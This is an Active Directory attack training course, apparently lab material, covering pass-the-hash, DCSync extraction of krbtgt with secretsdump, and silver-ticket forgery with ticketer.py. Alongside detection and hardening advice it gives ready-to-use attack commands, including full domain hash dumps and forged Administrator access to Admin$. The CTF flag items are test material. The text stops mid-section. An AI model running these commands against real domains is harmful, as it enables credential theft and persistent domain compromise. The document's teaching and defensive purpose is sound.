1. PtH works because NTLM authentication uses the NT hash directly. Why does Microsoft not just stop accepting NTLM?

Reveal Answer

Backwards compatibility. NTLM is the fallback when Kerberos is not available: workgroup hosts, machines that cannot reach a DC, downlevel clients, certain monitoring tools, third-party identity bridges, applications that hardcoded NTLM endpoints during their development. Disabling NTLM domain-wide in a typical enterprise breaks something on the order of dozens of integrations (sometimes hundreds), most of which are owned by teams that no longer exist or that regard NTLM as a deep dependency. Microsoft is moving toward NTLM disablement: Windows 11 and Server 2022 introduced "NTLM auditing" (event 8001) so administrators can quantify who actually uses NTLM, with the long-term plan to disable it. The migration path is years long for any enterprise that did not start in the late 2010s. Mid-migration environments often disable NTLM only on specific server classes (DCs, Tier-0 servers) while leaving it on workstations.

2. The exercise says PtH works on RDP only with Restricted Admin mode plus a registry tweak. What does Restricted Admin do, and why is it less convenient than regular RDP?

Reveal Answer

Restricted Admin mode (RDP) avoids sending the user's plaintext credential to the remote host. Instead, it uses Network Level Authentication (NLA) via NTLM with the NT hash. The remote host accepts the NTLM authentication and authorizes the user, but the user's credentials are not loaded into the remote LSASS. The implications: (a) the user can RDP with PtH (no plaintext required); (b) the user cannot reach further hosts from the RDP'd host using the same credentials, because the credentials are not present in memory to be re-used or stolen via Mimikatz. The trade-off is the second point: legitimate operators who RDP-then-RDP (jump host workflows) lose the credential-cache convenience. The registry tweak HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0 enables it; many organizations leave it disabled because the support cost of "I cannot RDP through the jump host" exceeds the security benefit.

3. The four execution tools (psexec, smbexec, wmiexec, evil-winrm) trade noise for capability. Rank them by likely SOC detection signal and explain why.

Reveal Answer

Loudest to quietest, roughly: psexec > smbexec > wmiexec > evil-winrm (in many environments). psexec installs a Windows service, fires event 7045 (service install) plus the service's own start events; SOCs commonly rule on 7045 from non-management origins. smbexec uses an SMB-only service install path that historically left less log evidence (no 7045 in some configs) but newer Windows versions log it similarly. wmiexec uses WMI process creation; event 4688 fires on the target with the parent process being WmiPrvSE.exe, which is detectable but blends with legitimate management traffic. evil-winrm uses WinRM (HTTP/5985 or HTTPS/5986); WinRM is often allow-listed for admin tools (Ansible, PowerShell Remoting, Configuration Manager), so the connection itself looks like normal admin traffic. The actual ranking depends on the environment: a SOC with strict WinRM monitoring sees evil-winrm immediately; a SOC drowning in WMI noise from SCCM may miss wmiexec entirely. Operators try the quietest tool that gets the job done first.

docs.title: Key Takeaways
docs.text:
• NTLM accepts the NT hash directly; PtH = use the hash where you would use the plaintext.
  • netexec smb -H <hash> is the smallest validation step.
  • Four common execution paths (psexec, smbexec, wmiexec, evil-winrm) trade noise for capability.
  • RDP requires Restricted Admin mode for PtH, and that mode is often disabled.
  • Microsoft's long-term plan is NTLM disablement; the migration is years long for most enterprises.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover the entire PtH workflow. Pick the execution tool to match the noise budget you have on the engagement.

Goal Command Validate hash via SMB netexec smb <host> -u Administrator -H '<NT hash>' --local-auth Interactive PowerShell shell evil-winrm -i <host> -u Administrator -H <NT hash> One-shot SYSTEM cmd psexec.py Administrator@<host> -hashes :<NT hash> Quieter Administrator one-shot wmiexec.py Administrator@<host> -hashes :<NT hash>

docs.title: Spaced Repetition
docs.text:
Card 1: netexec PtH One-Liner

Q: Validate local Administrator PtH against 10.10.10.20 with hash aad3b....

Answer 
netexec smb 10.10.10.20 -u Administrator -H 'aad3b...' --local-auth

--local-auth for local accounts. Drop it for domain accounts. -H takes the NT hash; the LM half is optional and usually empty.

Card 2: psexec.py Hash Format

Q: Write the psexec.py command for local Administrator on 10.10.10.20 with NT hash e5d3....

Answer 
psexec.py Administrator@10.10.10.20 -hashes :e5d3...

Format: LM:NT. LM is usually empty (:NT). Drops to a SYSTEM cmd shell. For domain auth: psexec.py CORP/Administrator@10.10.10.20 -hashes :NT.

Card 3: Where PtH Does NOT Work

Q: Name three contexts where you have an NT hash but PtH does not give you access.

Answer
  1. RDP without Restricted Admin mode + registry tweak (RDP normally requires plaintext at the workstation logon prompt). 2. Web SSO via Kerberos or SAML (those flows require a TGT or SAML assertion, not an NTLM hash). 3. Console / interactive logon at a workgroup machine (no NTLMSSP exchange involved; the SAM stores the hash but Windows logon UI does not accept the hash form). For each of these you need either the plaintext, a forged TGT, or a Silver/Golden ticket.

Card 4: evil-winrm with Hash

Q: Write the evil-winrm command to PowerShell-shell into srv01 as Administrator with NT hash 7777....

Answer 
evil-winrm -i srv01 -u Administrator -H 7777...

Drops to a PowerShell prompt as Administrator. Works against any Windows host with WinRM enabled (port 5985 default). Useful built-ins at the prompt: upload localfile remotefile, download remotefile localfile, Invoke-Command.

Card 5: NTLM Disablement Trajectory

Q: Why is Microsoft's plan to disable NTLM taking so long?

Answer

Backwards compatibility. NTLM is the fallback when Kerberos is unavailable, used by workgroup hosts, downlevel clients, third-party tools that hardcoded NTLM endpoints, and many monitoring/management tools whose vendors have not migrated. Disabling NTLM in a typical enterprise breaks dozens or hundreds of integrations whose owners are unknown or unresponsive. Microsoft is shipping NTLM auditing (event 8001) so administrators can quantify usage before disabling. Mature environments are doing partial disablement (Tier-0 first, then DCs, then sensitive servers); full domain-wide disablement is years out for most enterprises.

docs.title: Before You Begin
docs.text:
Domain Controllers replicate with each other using the Directory Replication Service Remote Protocol (DRSUAPI). One side asks "send me your changes since this version"; the other side responds with the requested objects, including their secrets (NT hashes, AES keys, supplemental credentials). Any user granted the two extended rights DS-Replication-Get-Changes and DS-Replication-Get-Changes-All can speak this protocol; regardless of whether they are a DC. The flag combination is called "DCSync rights" and the resulting attack pattern is called DCSync.

DCSync is the canonical "extract everyone's hash" technique. Domain Admins have it by default. So do Enterprise Admins, Domain Controllers (the group), and historically anyone the administrator chose to grant it to (Azure AD Connect, Microsoft Identity Manager, third-party identity sync products).

Exercise 5.2 gives you an account that has DCSync rights and asks you to extract krbtgt.

Tools required: impacket-secretsdump. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "DCSync is the same protocol DCs use to replicate with each other. If a user has Replicating Directory Changes plus Replicating Directory Changes All, they speak that protocol whether they are a DC or not."

The flag is sha256(krbtgt_NT_hash + scope_token) wrapped in OCR{...}.

Credentials:

Username Password Source svc_dcsync_<token> (per-token, see lab dashboard) Provided

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Verify the account works
  • Run secretsdump.py -just-dc-user krbtgt
  • Compute sha256(krbtgt_NT_hash + scope_token)
  • Submit OCR{<sha256>}

docs.title: DCSync on the Wire
docs.text:
The diagram below shows what secretsdump.py -just-dc-user krbtgt does at the protocol level. One DRSUAPI call, one response, one hash.

sequenceDiagram
    autonumber
    participant A as Attacker (svc_dcsync)
    participant DC as Domain Controller (corp-dc01)

    A->>DC: DRSUAPI bind (RPC over SMB pipe)
    DC-->>A: bind ACK
    A->>DC: DRSGetNCChanges<br/>NCObjectGUID = krbtgt<br/>requested attributes = secrets
    DC-->>A: NTLM hash, AES128/256 keys,<br/>supplemental credentials
    Note over A: secretsdump prints the krbtgt hash<br/>krbtgt:502:aad3b435...:NT_HASH_HERE

docs.title: Where DCSync Rights Come From
docs.text:
The two extended rights surface on a small set of principals by design and on more principals by misconfiguration. The table below tells you who to expect on a baseline domain.

Principal Expected? Why Domain Admins yes Default grant on domain root Enterprise Admins yes Default grant on domain root BUILTIN\Administrators yes Default grant on domain root Domain Controllers group yes DCs replicate with each other Azure AD / Entra Connect service account yes (if configured) Password Hash Sync requires it Microsoft Identity Manager service yes (if configured) Identity sync requires it Backup software service account usually no Almost always abuse path "Service account that needed extra rights" no Misconfiguration; treat as finding

docs.title: Background: The Two Extended Rights
docs.text:
DCSync requires two rights on the domain object:

Right GUID What it allows DS-Replication-Get-Changes 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 Receive replication changes (basic attributes) DS-Replication-Get-Changes-All 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 Receive replication changes including secrets

The "All" variant is the one that exposes secrets. Without it the attacker still gets a lot, but not the hashes that make DCSync useful. With both, the attacker calls DRSGetNCChanges and gets every requested object's secret in the response. impacket's secretsdump.py automates the call and parses the response.

Granted-by-default to: - BUILTIN\Administrators - Domain Admins - Enterprise Admins - Domain Controllers group

Granted by intentional misconfiguration: - Azure AD Connect / Entra Connect (legitimate need) - Microsoft Identity Manager (legitimate need) - Backup software accounts (sometimes legitimate; usually not) - "Service accounts that needed extra rights" (almost always abuse path)

The defender control is to enumerate every principal with these two rights and verify each one is intentional. PingCastle reports them. BloodHound shows them as DCSync edges. The query:

MATCH (n)-[:DCSync]->(d:Domain) RETURN n

The graph view renders the principal nodes that have DCSync rights; switch to the Table view tab and RETURN n.name, d.name for a list of principal+domain pairs.

Any non-Tier-0 result is a finding.

docs.title: Detection: event 4662
docs.text: When DRSUAPI is invoked, the DC logs event 4662 (Directory Service Access) with the GUID of the right being exercised. Filter for 1131f6aa or 1131f6ad in event 4662; non-DC sources of those events are immediate alerts. Most SOCs do not have this rule by default; turning it on catches DCSync attacks reliably.

docs.title: What secretsdump dumps
docs.text:
By default, secretsdump.py against a DC returns: - NT hash of every domain user - LM hash (usually empty on modern domains) - Kerberos keys (DES, AES128, AES256) - Supplemental credentials (clear-text passwords if Store password using reversible encryption is set; rarely used) - Cached credentials (CACHED_DOMAIN_LOGON_INFO from the local SAM/LSA; not via DRSUAPI but via the same call chain) - Computer account hashes (every machine secret)

For this exercise we want only krbtgt. The -just-dc-user krbtgt flag tells secretsdump to use targeted DRSGetNCChanges rather than dumping the entire ntds. Faster, quieter, and yields the exact value we need.

docs.title: secretsdump targeted user
docs.text:
secretsdump.py -just-dc-user krbtgt \
  corp.nordport.local/svc_dcsync_<token>:'<password>' \
  -dc-ip <dc_ip>

Output:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32-hex-char NT hash>:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:<aes256-key>
krbtgt:aes128-cts-hmac-sha1-96:<aes128-key>

The aad3b435b51404eeaad3b435b51404ee LM hash is the canonical "empty LM" sentinel; ignore it. The 32-char NT hash after the third colon is what you want.

docs.title: Compute the flag
docs.text:
NTHASH='<32 hex chars from secretsdump>'
TOKEN="${OCR_SCOPE_TOKEN}"
SHA=$(echo -n "${NTHASH}${TOKEN}" | sha256sum | awk '{print $1}')
echo "OCR{${SHA}}"

docs.title: Step 1: Validate the Account
docs.text:
Confirm the credential before exercising the rights. A failed authentication here saves you from chasing a permission error in Step 2 (which can look identical to a misconfigured DCSync grant).

Kali - Confirm svc_dcsync_ works 

netexec smb corp-dc01 \
  -u "svc_dcsync_${OCR_SCOPE_TOKEN}" -p '<password>' \
  -d corp.nordport.local
Token Effect smb corp-dc01 SMB module against the DC. -u <user> -p <pw> Domain credential. -d <domain> Domain to authenticate against (DCSync rights live on the domain object).

[+] confirms. [-] STATUS_LOGON_FAILURE means the password is wrong; [+] followed by (Pwn3d!) would mean the account is also a local admin on the DC, which is over-privileged for this scenario.

docs.title: Step 2: Extract krbtgt
docs.text:
secretsdump.py -just-dc-user krbtgt opens a DRSUAPI bind to the DC and calls DRSGetNCChanges requesting only the krbtgt object's secrets. The DC checks the caller's effective rights on the domain object; the two replication ACEs permit the call. The response includes the NT hash, the AES128/256 keys, and any supplemental credentials.

Kali - secretsdump targeted dump

secretsdump.py -just-dc-user krbtgt \
  "corp.nordport.local/svc_dcsync_${OCR_SCOPE_TOKEN}:<password>" \
  -dc-ip <dc_ip>
Flag Effect -just-dc-user <user> Targeted DRSGetNCChanges for one user. Faster + quieter than -just-dc. <realm>/<user>:<pw> Authentication string (impacket format). -dc-ip <ip> DC IP.

The output line of interest:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::

Field decoding (colon-separated): username:RID:LM_hash:NT_hash:::. The aad3b435b51404eeaad3b435b51404ee is the canonical "empty LM" sentinel; ignore it. The 32-hex-char value after the third colon is what you want. The lines after the user line list the Kerberos AES keys (use those for golden ticket forgery in Exercise 5.4).

docs.title: Step 3: Compute the Flag
docs.text:
The flag is sha256(NT_hash + scope_token) to bind your submission to your token. The echo -n is critical: a trailing newline would change the SHA output.

Kali - SHA-256 the hash + token

NTHASH='<paste the 32-hex-char NT hash here>'
TOKEN="${OCR_SCOPE_TOKEN}"
SHA=$(echo -n "${NTHASH}${TOKEN}" | sha256sum | awk '{print $1}')
echo "OCR{${SHA}}"
Token Effect echo -n No trailing newline. Critical for hash reproducibility. sha256sum SHA-256 the input; output is <hash> -. awk '{print $1}' Print only the hash, not the trailing -.

Submit the OCR{...} value on the platform.

docs.title: Step 4: Note What Else You Could Have Dumped
docs.text:
In a real engagement you would dump everything:

secretsdump.py -just-dc \
  "corp.nordport.local/svc_dcsync_${OCR_SCOPE_TOKEN}:<password>" \
  -dc-ip <dc_ip> -outputfile dump

dump.ntds would contain every user's hash. From that you can pass-the-hash to anyone, crack offline against rockyou, or forge silver tickets for any service account. The exercise restricts to krbtgt to keep the deliverable focused; the underlying capability is much broader.

Common gotchas

  • STATUS_DRSUAPI_REQUIRED: the account does not have the two replication rights on the domain object. Confirm the grant is current with dsacls "DC=corp,DC=nordport,DC=local" | grep svc_dcsync.
  • DRSUAPI bind failure: secretsdump tries SMB pipe first, then falls back to TCP; some DC firewalls block direct DRSUAPI port. --use-vss is a different-syntax workaround using volume shadow copy (requires SMB admin on the DC).
  • Targeting wrong DC: in multi-DC environments the krbtgt hash is the same everywhere (replication keeps it in sync), but a stale read replica may take minutes to converge after a krbtgt rotation. Re-pull from the PDC if the hash looks suspiciously identical to a known-old value.
  • Trailing newline in SHA: every other shell pipeline trims newlines, but echo (without -n) adds one. Forgetting -n produces a different SHA than the platform expects; the flag is rejected.
  • Hash case: secretsdump prints lowercase hex. The platform accepts case-insensitively, but if you copy-paste into a separate hash tool that is case-sensitive (rare but exists), normalize to lower.

docs.title: Blue Team Perspective
docs.text:
The detection signal lives in event 4662 with the right GUIDs and a non-DC source. Properly configured, this is one of the highest-signal alerts in any AD environment.

Activity Event ID Field giveaway DRSUAPI replication call 4662 Properties contains 1131f6aa or 1131f6ad DRSUAPI from non-DC source 4662 + 4624 source IP not on DC list Defender for Identity "Suspected DCSync attack (replication of directory services)" MDI Bulk NTDS replication many 4662 events in seconds DC Security log

Configuring the SACL for detection

Default audit policies do not log every 4662; you must add a SACL on the domain object that audits the two replication GUIDs. Once configured, alert on any 4662 with those GUIDs whose source IP is not in the DC list. Cardinality is near zero in normal operation; signal is very high. MDI configures the SACL automatically.

docs.title: Hardening Note
docs.text:
DCSync rights are intentional on a small set of principals and rare to need beyond that. The list below is the realistic audit and hardening menu.

DCSync hardening

  • Run dsacls "DC=corp,DC=nordport,DC=local" \| findstr /i replicat quarterly. Every principal returned is either on the expected list or a finding.
  • BloodHound: MATCH (n)-[:DCSync]->(d:Domain) RETURN n.name. Any non-Tier-0 result is a finding.
  • Move AD Connect / Entra Connect to a Tier-0-classified server with full DC-equivalent monitoring.
  • Configure SACL audit on domain object for the two replication GUIDs; forward to SIEM.
  • Plan and execute a krbtgt double rotation every 6-12 months.
  • Enable Defender for Identity for built-in DCSync detection.

docs.title: Record Your Findings
docs.text:
Account used:

svc_dcsync_<token>

krbtgt NT hash:

(32 hex chars)

Flag:

OCR{<64 hex chars>}

docs.title: Analysis Questions
docs.text:
1. The DS-Replication-Get-Changes-All right is granted to Azure AD Connect by design. What is the operational risk of that, and how should it be managed?

Reveal Answer

Azure AD Connect (now Entra Connect) needs to read every user's password hash to compute the Azure AD password hash sync (PHS) value. The legitimate setup grants the AD Connect service account both DCSync rights on the domain root. The risk: a compromise of the AD Connect service account is a domain-wide credential compromise. Defender controls: (a) install AD Connect on a Tier-0 server, treated as a DC for security purposes; (b) rotate the AD Connect service account password regularly and monitor for use from non-AD-Connect sources; (c) monitor event 4662 for the two replication GUIDs and alert on any source that is not the AD Connect server; (d) consider Pass-Through Authentication (PTA) instead of PHS for environments where the synchronized hashes are not strictly needed. The risk is intrinsic to the architecture; the management is operational discipline.

2. The exercise pulls only krbtgt. Why is krbtgt the highest-value target inside ntds, and what does possession of its hash enable?

Reveal Answer

krbtgt is the account that encrypts every TGT in the domain. Its NT hash (or AES key) is the "domain master key" for Kerberos. Possession of krbtgt's hash lets you forge TGTs for any user (golden tickets). Forged TGTs are accepted by every DC and every Kerberos-aware service in the domain because the krbtgt hash is the authentication root of trust. The forgery is undetectable in the tickets themselves: a forged TGT looks like any other valid TGT. The only way to invalidate forged tickets is to rotate krbtgt's password twice (the second rotation discards the previous password, invalidating tickets encrypted with the old key). Most organizations have never rotated krbtgt; a single DCSync of krbtgt yields persistent domain-wide impersonation that survives any user password change.

3. The defender alert is event 4662 with the replication GUIDs from a non-DC source. Why is this not a default alert in most SIEMs?

Reveal Answer

Event 4662 (Directory Service Access) fires for many directory operations beyond just replication: any object access at the directory layer with auditing enabled. The default Windows audit policy logs 4662 for some operations but not all; turning on full Object Access auditing produces enormous volume (tens of thousands of events per hour on a busy DC). To make replication-specific alerting practical, defenders need to: (a) enable auditing for the specific GUIDs only (auditpol /set with a custom SACL on the domain object), or (b) use a SIEM rule that filters 4662 by the GUID property. Most SIEMs do not ship with this rule pre-built because it requires the customer to also configure the SACL on the domain object. Microsoft Defender for Identity does this automatically and alerts on suspicious DCSync; it is the easiest path for defenders who do not want to build custom rules.

docs.title: Key Takeaways
docs.text:
• DCSync needs two rights: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
  • secretsdump.py -just-dc-user <user> performs a targeted DRSGetNCChanges call.
  • krbtgt is the domain master key; one DCSync = persistent domain compromise.
  • Detection: event 4662 with the replication GUIDs from non-DC sources.
  • BloodHound shows DCSync paths as DCSync edges; PingCastle and dsacls audit the right grants.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover discovery, surgical extraction, and the full domain dump. Use the targeted variant unless you genuinely need everything.

Goal Command Find DCSync principals (BloodHound) Cypher: MATCH (n)-[:DCSync]->(d:Domain) RETURN n.name, d.name Targeted: pull krbtgt only secretsdump.py -just-dc-user krbtgt "<domain>/<u>:<pw>" -dc-ip <dc> Targeted: any specific user secretsdump.py -just-dc-user "<USER>" "<domain>/<u>:<pw>" -dc-ip <dc> Full domain hash dump secretsdump.py -just-dc "<domain>/<u>:<pw>" -dc-ip <dc> -outputfile dump

docs.title: Spaced Repetition
docs.text:
Card 1: secretsdump Targeted

Q: Pull only krbtgt's hash from corp.local DC 10.10.10.10 using account svc_x:Pass#.

Answer 
secretsdump.py -just-dc-user krbtgt \
  "corp.local/svc_x:Pass#" \
  -dc-ip 10.10.10.10

Output line: krbtgt:502:aad3b...:NT_HASH:::. The aad3b... is empty LM. The 32 chars after the third colon are your NT hash.

Card 2: DCSync Right GUIDs

Q: Name the two extended right GUIDs that together enable DCSync.

Answer

1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All). Both are required; the "All" variant is the one that exposes secrets. Granted on the domain object by default to Domain Admins, Enterprise Admins, BUILTIN\Administrators, and the Domain Controllers group.

Card 3: Why krbtgt Is the Master Key

Q: Possession of krbtgt's NT hash enables what attack, and why does rotating user passwords not invalidate the tickets it forges?**

Answer

Golden ticket forgery: forge a TGT for any user with any group membership claims; every DC accepts the forged TGT as authentic because krbtgt's hash is what encrypts every legitimate TGT. User password rotations do not affect krbtgt; the only way to invalidate forged tickets is to rotate krbtgt twice (twice because the previous-and-current password are both honored briefly, and one rotation leaves a window for old-key tickets). Most environments have never rotated krbtgt, so a single DCSync persists indefinitely.

Card 4: Detection Event

Q: What Windows event ID + GUID combination indicates DCSync, and what additional configuration is needed for the event to fire?

Answer

Event 4662 (Directory Service Access) with Properties containing GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2. To make it fire reliably, the domain object's SACL must include audit ACEs for those rights. Default audit policies often miss this; the explicit configuration is required. Defender for Identity adds the SACL automatically.

Card 5: Why You Want Just-DC Variants

Q: Compare secretsdump.py -just-dc vs secretsdump.py (no flag). When do you use each?

Answer

-just-dc (and -just-dc-user, -just-dc-ntlm) use DRSUAPI to pull only the requested data, no SAM/LSA dump. Faster, quieter, and works against any reachable DC. Plain secretsdump.py (no flag) ALSO performs an LSA secrets dump from the host you are authenticating as, which requires admin on that host and is loud. Use -just-dc-user krbtgt for surgical extraction. Use -just-dc for the full domain hash dump. Use plain secretsdump.py target only when you also want LSA secrets from the target host (cached domain logon info, machine secret, etc.).

docs.title: Before You Begin
docs.text:
A silver ticket is a forged TGS. You craft a service ticket from scratch, encrypt it with the target service's NT hash (or AES key), and present it to the service. The service decrypts the ticket, sees a valid PAC, and authenticates you as whoever you put in the ticket. The KDC is never involved; there is no AS-REQ, no TGS-REQ, no event 4769 on the DC. The signal lives entirely on the target service.

The single-service scope makes silver tickets attractive when you need persistence on a specific service: the ticket works as long as the service account password does not rotate, and rotation is the only invalidation mechanism. Silver tickets are quieter than golden tickets (golden = forged TGT = used everywhere; silver = forged TGS = used on one service). Narrower scope; quieter footprint.

Exercise 5.3 gives you the NT hash for svc-app01_<token>$ (a machine account) plus the domain SID. Forge a silver ticket for cifs/svc-app01_<token> as Administrator, mount the Admin$ share, read the flag.

Tools required: impacket-ticketer. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "If you have the NT hash of a service account, you can forge a service ticket for that service that the service will accept without ever asking the KDC. Quieter than golden, narrower scope, sometimes more useful."

The NT hash and domain SID are in the lab dashboard.

Credentials:

Item Value Service account svc-app01_<token>$ NT hash (per-token, dashboard) Domain SID (per-token, dashboard; S-1-5-21-...)

Domain: corp.nordport.local Target service: cifs/svc-app01_<token>.corp.nordport.local

docs.title: Your Objectives
docs.text:
• Forge a silver ticket for cifs/svc-app01_<token> as Administrator with ticketer.py
  • Load the ticket into your credential cache
  • Mount \\svc-app01_<token>\Admin$ as Administrator
  • Read silver_flag_<token>.txt and submit

docs.title: Silver Ticket Auth Flow
docs.text:
The KDC sees nothing. The diagram below shows what the wire actually carries: a forged TGS is presented straight to the target service.

sequenceDiagram
    autonumber
    participant A as Attacker (Kali)
    participant K as KDC (corp-dc01)
    participant S as Target service<br/>cifs/svc-app01_<token>

    Note over A: ticketer.py forges TGS locally,<br/>signs with svc-app01_<token>$ NT hash
    A--xK: (no AS-REQ, no TGS-REQ)
    A->>S: AP-REQ wrapping forged TGS<br/>PAC says "Administrator, Domain Admins"
    Note over S: decrypt with own key (matches),<br/>validate server signature only
    S-->>A: SMB session as Administrator
    Note over S: KDC signature validation OFF by default,<br/>so forgery accepted

docs.title: Silver vs Golden Side by Side
docs.text:
The two ticket forgeries look superficially similar but differ in scope, key, and invalidation. The diagram below contrasts them.

flowchart TB
    subgraph Silver["Silver Ticket"]
        SK["Forging key:<br/>service account NT hash"]
        SS["Scope: 1 service<br/>(every SPN of that account)"]
        SI["Invalidation:<br/>rotate service account password"]
    end
    subgraph Golden["Golden Ticket"]
        GK["Forging key:<br/>krbtgt NT hash"]
        GS["Scope: every service in domain"]
        GI["Invalidation:<br/>rotate krbtgt twice"]
    end

docs.title: Background: Silver vs Golden
docs.text:
Property Silver Ticket Golden Ticket What is forged TGS-REP (service ticket) AS-REP TGT Signing key Service account NT hash / AES krbtgt NT hash / AES Scope One service Every service in the domain KDC interaction None (presented directly to service) None (TGT used to mint TGSes locally; no AS exchange) Detection signal Service-side PAC validation failures (rare); no KDC events Anomalous TGT lifetimes (often default 10 years in forgeries vs 10 hours real); KDC events 4769 with mismatched parents Invalidation Rotate the service account password Rotate krbtgt twice Persistence value Per-service, weeks-to-years Domain-wide, until krbtgt rotates

The silver ticket's narrower scope is the trade-off: quieter, but only useful for the one service whose key you have. Operators use silver tickets when they have a specific target (a backup share, a database server, a file server holding sensitive data) and want to access it persistently without DC contact.

docs.title: Why the service accepts a forged ticket
docs.text:
Service tickets are decrypted by the service using its own password-derived key. The decrypted ticket includes: - Authentication time - Authorization data (the PAC, with user SID and group memberships) - Various flags

The service does not call back to the KDC to validate the ticket. The PAC has its own signatures (server signature + KDC signature), but on default Microsoft installations the KDC signature is not validated by the service; only the server signature, which is created with the service's own key. Since the attacker has that key, both signatures are forge-able.

Microsoft introduced PAC validation modes that require services to call the KDC for the KDC-signature check, but the default for most services is "do not validate." The default-off behavior is why silver tickets work in practice.

docs.title: What goes in the ticket
docs.text:
ticketer.py populates: - User SID (e.g., Administrator's: <DomainSID>-500) - User name (Administrator) - Domain SID - Group SIDs (default: 513, 512, 520, 518, 519 = Domain Users, Domain Admins, Group Policy Creator Owners, Schema Admins, Enterprise Admins) - Auth time, ticket lifetime - Flags (forwardable, renewable, etc.)

The default group set is "all the famous groups" including Domain Admins. The service does not check whether the user is actually in those groups; the PAC says they are, the service trusts the PAC.

docs.title: ticketer.py for silver ticket
docs.text:
ticketer.py \
  -nthash <NT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain corp.nordport.local \
  -spn cifs/svc-app01_<token>.corp.nordport.local \
  Administrator
Flag Effect -nthash the service account's NT hash (the forging key) -domain-sid the domain SID (so the ticket's Administrator SID is constructed correctly) -domain realm name -spn the service principal name in the ticket - positional argument: the impersonated user

Output: Administrator.ccache written to current directory.

docs.title: Using the forged ticket
docs.text:
export KRB5CCNAME=Administrator.ccache
klist
smbclient //svc-app01_<token>.corp.nordport.local/Admin$ -k -c "ls"

-k tells smbclient to use the cached Kerberos ticket. The service receives the AP-REQ wrapping the ticket and authenticates the session as Administrator.

docs.title: Step 1: Gather the Inputs
docs.text:
Silver-ticket forgery needs four inputs: the service account's NT hash (the forging key), the domain SID (so the impersonated user's SID is constructed correctly), the realm name, and the SPN of the target service. The lab dashboard supplies the first two; the realm and SPN you derive from the scenario.

From the lab dashboard, note:

Service account:   svc-app01_<token>$
NT hash:           <32 hex chars>
Domain SID:        S-1-5-21-XXXX-YYYY-ZZZZ
Service host FQDN: svc-app01_<token>.corp.nordport.local

If you do not have the domain SID, derive it from any object's SID by stripping the trailing RID: S-1-5-21-1234-5678-9012-500 (Administrator) drops the -500 to give S-1-5-21-1234-5678-9012. secretsdump.py -just-dc-user krbtgt also prints the domain SID in its output.

docs.title: Step 2: Forge the Silver Ticket
docs.text:
ticketer.py builds a TGS structure from scratch: it fills in the user/group SIDs, server signature with the supplied NT hash, and writes a Kerberos credential cache file. No DC contact occurs; the entire forgery is local.

Kali - ticketer.py

cd ~/work && mkdir -p adpt-5-03 && cd adpt-5-03
ticketer.py \
  -nthash '<NT hash>' \
  -domain-sid 'S-1-5-21-XXXX-YYYY-ZZZZ' \
  -domain corp.nordport.local \
  -spn "cifs/svc-app01_${OCR_SCOPE_TOKEN}.corp.nordport.local" \
  Administrator
ls -la Administrator.ccache
Flag Effect -nthash <hash> NT hash of the service account; the forging key. Use -aesKey for AES-only environments. -domain-sid <SID> Domain SID prefix (without trailing RID). -domain <realm> Realm name. Lowercase or uppercase both work; ticketer normalizes. -spn '<svc>/<host>' SPN this ticket is good for. Must match how the client will request the service. <user> Positional: the user identity the ticket impersonates.

The output is <user>.ccache (here Administrator.ccache) ready to use. ticketer prints [+] Saving ticket in Administrator.ccache on success.

docs.title: Step 3: Use the Ticket
docs.text:
The ccache is loaded by setting KRB5CCNAME. SMB-aware tools with -k use cached Kerberos credentials transparently. The target service receives an AP-REQ wrapping the forged TGS; it decrypts with its own key (matches), validates the server signature (matches because we used its key), and serves the request as Administrator.

Kali - smbclient with the forged ticket

export KRB5CCNAME=$(pwd)/Administrator.ccache
klist
smbclient "//svc-app01_${OCR_SCOPE_TOKEN}.corp.nordport.local/Admin$" -k \
  -c "ls; get silver_flag_${OCR_SCOPE_TOKEN}.txt"
cat silver_flag_${OCR_SCOPE_TOKEN}.txt
Token Effect KRB5CCNAME=$(pwd)/... Absolute path required (relative paths confuse some GSSAPI versions). klist Display the ccache contents; verifies the right principal/SPN is loaded. -k Use cached Kerberos credentials for SMB.

Submit the OCR{...} value.

docs.title: Step 4: Confirm No DC Events
docs.text:
For learning, confirm the KDC saw nothing. From the DC's event log, search 4769 events around the time of your operation. There should be none from your source IP for the silver-ticketed SPN. The TGS was forged locally; the KDC never received a request. Compare to the GenericAll exercise (4.1) where 4724 fires immediately on the DC; the silence here is the silver ticket's defining advantage.

Common gotchas

  • SPN mismatch: the SPN in the ticket must exactly match the SPN derived from how the client connects. //host/share derives cifs/host; //host.fqdn/share derives cifs/host.fqdn. Pick one and be consistent.
  • Wrong RID for impersonation: Administrator always has RID 500. ticketer hardcodes the right value when given the user name; if you supply -user-id 500 explicitly, double-check.
  • Stale credential cache: KRB5CCNAME may already point at a previous TGT. Clear with kdestroy -A (all caches) or set KRB5CCNAME to the new file's full path to override.
  • AES-only KDC: if the domain disables RC4, the service's stored key is AES, not NT hash. Use -aesKey <key> instead of -nthash. The AES256 key from secretsdump output works directly.
  • PAC validation enabled: rare but possible; if the target enforces KDC PAC signature validation, the silver ticket fails because you cannot forge the krbtgt-signed portion. Switch to a different target service.

docs.title: Blue Team Perspective
docs.text:
Silver tickets are the quietest forgery in AD. The detection has to live on the target service or rely on cross-referenced logs.

Activity Event ID Where it fires Auth as Administrator on target 4624 logon type 3 Target Security log Missing 4769 for the same auth 4769 absence DC Security log (cross-reference) KDC PAC validation failure 4673 (failure) DC + target log (only if validation on) Defender for Identity "Suspected Golden Ticket usage (encryption downgrade)" MDI (catches ticket anomalies)

Why detection is hard

